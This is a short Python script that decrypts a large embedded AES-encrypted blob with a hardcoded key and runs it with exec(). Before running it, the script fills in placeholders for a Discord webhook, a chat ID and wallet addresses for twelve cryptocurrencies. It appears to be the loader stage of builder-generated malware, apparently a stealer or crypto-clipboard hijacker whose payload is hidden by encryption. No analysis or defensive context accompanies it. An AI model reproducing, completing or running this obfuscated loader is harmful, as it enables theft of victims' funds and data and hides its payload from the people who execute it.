
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA512
from Crypto.Util.Padding import unpad

def decrypt(encdata, masterkey, salt):
    encdata_bytes = base64.b64decode(encdata)
    salt_bytes = base64.b64decode(salt)
    iv = encdata_bytes[:16]
    ciphertext_bytes = encdata_bytes[16:]
    key = PBKDF2(masterkey.encode('utf-8'), salt_bytes, dkLen=32, count=1000000, hmac_hash_module=SHA512)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_bytes = cipher.decrypt(ciphertext_bytes)
    decrypted_text = unpad(decrypted_bytes, AES.block_size).decode('utf-8')
    return decrypted_text

decrypted = decrypt("XqTHx7qp5hv5LVaXGUTX+pI8/0ER0Kr3QFJGb7fw8gluKv4HwC77OsrNKTG7o/vJGmNza1brq77ImFndO9iAgkMSo7l1q5OiBAwHbCfIB3HW6fo2vbGmWwmLV+U28gHagIAYqQZewuRhj5oIIZQZygUbnp/8LQYBB/vPUht/Q0GZHIByD62uVFHtDCNRssflywwV+VfvS1M9Qs3EXrZEGgpmrTS4bAQNcWUnBXa3/Bpl7QwxVXrq72lKj/F9LjHszW99Bp9U/R7JjaIfyRZ3yW79T6/HaexHiQ+CCh3i925z2N9cYZoOX0jKoBGtk4vlI78Efa9CPEVLeZvybdna0JpijM1M+7n8KRzmRnbj9JCNLJnl835jgoLaHTBb+UGDUaAg32L3DOm49so2Fw4cCEcJwtQzMRI3FU0AZUAnwiBMrmIF+7CXPOaCUcpA9HIjsil24+ftSJLJCg1R4Jqo9O/YNKyBmPRsS4X6UnbMxbL0a8tkSnH/51b6tdP3UNHl68zympgxUL3/dBvCzd4/1Qyq4Wv+B59Yn51tLTE6VhL1Qji5kIGQRcYJmx58KepqkhTD/Dac8eq6jDxISobzwt7J6vsSsuJep8Q3rwgOjTCE1d8kjzY0sKY36Y8MP2sguLfOXtnQWCxN/ccbP4Mh/CvBhuvPI03bYry+g6Zr5FxeJq5u1BrMGAyBR3COGdWQmN3QT7RwI4wXRDwJWlfOhmn3lvW2B2SEQnMH4gU7i2Sj8mGEFQw3D4piKAGWnmVgtM4JxEkcXLB3kRRh8vwGNYIkAMGNmj8veyXaCQ0IYSfZuRAxm8dEnq1gfMy39XxPAj0MndO9qv+xJEDGndl//qniHk7XYMe0p7x5v4OeuA7NjNL9IbRdC0uD1DGCukTyzh6idBuoxahF9JSO+VJjy6fYu4TDTEc6O9TjztxgvNGCeyMetA2iH6DapQkNGPe9/V4relnZtvNvY1orFibOu3DtWkyrYAuugU8LCXSuXqtk3Bjr+XxHi4TK4q2xOwKFrZkvFw+RF3whZV2tRSXZp45wXfV/VIcYzCuFIyzFO9UIQFy1VazgBwJOX7Rq8cYIEP744desazdRmjf2Cj3AbxgVTm6TivcoBOzgIctsDd+/LeBwdPvrX5GODON9qAn3A7gUTGKOAZ/AxwaPlbrh6ybts1r0lURkj/gIOAUCuPkqQQk6RXX00PgCc2xtIW8mF09dLZTdh5Quqt8eJ+g+UWUf6jE5NR0D/1eJnf2oQHAbg8L7q/qJgwz7wALMOBPEHq88auiehjKBvOqlwZWoMHex5Szc/z/CutD0J2kBUeZnj8ajZjdWR1gj/Y/d3XrBwVKnGR5Weihm5MFZ/msyR5JIhBk5Gl/pZc/WnAetkYoGZRrBFSc+NljMwuJARp3s7EHX1Ms4lHIOqLcBVs5dlQE8DjPDIiXwoxlT9dDg8CI0jdxP3w/MrB20roIoFhKGJHkoGl4IcQYoUDMndtH5/YIBpq3cUtcTFQSfJIbc+L5a/a7Dz1bQFSKveFyBUVCyfgTOwjoaoNW59IxjopLk5Mqvefh0y5sSZCkhCD8W+lvVNRQQLuHnoPg1G/7EFQZDzQS/py1yKOafbPJED7/o3ZVJyGOETm2w1cb/2hbIGIvOsXKRCBtMqn8GtjxElJWZaJf3Jc3ptvxOQUJuic8+Jch/HB8HyszTdmxQ4uFTYDemq3RanJBP3vaUPu2IA9SEjVxYHCe2c1JpNYpATYO8GlKQgFW/xG3CuE/wLQ2oF86MlD78Y1b/4FB8xbXyetBX7TyhfZs1MQJ6tFCul9p0dqGNbUSZRqUsskyqfwh2bb3to13SdrlHZrlu8bvdTVMcZVJpBjxvY7koOdH3QGxnsoj8Toj0WE/vMSF3rblMItYfzvfl/xB+X6m1Wc200nMIjS1O74+GXBJB6+SLenUYhwTMQWymnhz8n3WLvZw2Gx8WVg5ZSzaVig/hOqJlJ+nZ", "c7806605e4f8ce0aad43420adb2740d7a85839176d2fb2ca2e15e9cf6bf909ce", "rrADLSKZ6UrXMo+Q84C7GA==")
exec(decrypted.replace("%WEBHOOKURL%", "%DISCORD%").replace("%CHATID%", "%USERID%").replace("%BTCADDRESS%", "%ADDRESSBTC%").replace("%ETHADDRESS%", "%ADDRESSETH%").replace("%DOGEADDRESS%", "%ADDRESSDOGE%").replace("%LTCADDRESS%", "%ADDRESSLTC%").replace("%XMRADDRESS%", "%ADDRESSXMR%").replace("%BCHADDRESS%", "%ADDRESSBCH%").replace("%DASHADDRESS%", "%ADDRESSDASH%").replace("%TRXADDRESS%", "%ADDRESSTRX%").replace("%XRPADDRESS%", "%ADDRESSXRP%").replace("%XLMADDRESS%", "%ADDRESSXLM%").replace("%SHOWERROR%", "%ERRORSTATUS%"))
